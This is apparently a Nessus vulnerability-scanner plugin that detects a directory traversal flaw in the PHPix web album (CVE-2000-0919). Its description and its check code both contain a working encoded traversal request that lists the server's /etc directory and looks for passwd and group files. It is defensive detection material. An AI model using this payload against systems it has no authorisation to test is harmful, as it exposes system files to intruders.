#
# This script was written by Zorgon <zorgon@linuxstart.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10574);
 script_bugtraq_id(1773);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-0919");
 
 name["english"] = "PHPix directory traversal vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "PHPix program allows an attacker to read arbitrary files on the remote web server,  prefixing the pathname of the file with ..%2F..%2F..

Example:
    GET /Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0

will return all the files that are nested within /etc directory.

Solution: Contact your vendor for the latest software release.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "PHPix directory traversal vulnerability";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2000 Zorgon <zorgon@linuxstart.com>");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
  buf = http_get(item:string("/Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0"), port:port);
  rep = http_keepalive_send_recv(port:port, data:buf);
  if("Prev 20" >< rep)
  	{
	if(("group" >< rep) && ("passwd" >< rep))
         	security_hole(port);
	}
}
